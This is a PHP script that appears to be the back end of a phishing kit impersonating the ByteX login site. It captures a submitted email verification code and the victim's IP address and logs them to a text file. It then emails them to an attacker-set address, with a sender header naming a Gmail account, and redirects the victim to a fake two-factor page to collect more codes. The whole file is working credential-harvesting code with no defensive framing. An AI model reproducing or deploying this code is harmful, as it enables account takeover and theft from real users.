<?php
$file = "____ByteX___.txt";
$ECode = $_POST['ECode'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Email Kode   	: ");
fwrite($handle, "$ECode");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://accounts.bytex.io/login/ ");
fwrite($handle, "\n");
fclose($handle);
$ECode = $_POST['ECode'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

Email Kode : ".$ECode." 

";
include 'mail.php';
$subject = "bytex ".$ip." ";
$headers = "From: centric <fauzijasman193@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/2fa.html?/authen\";
// -->
</script>";
?>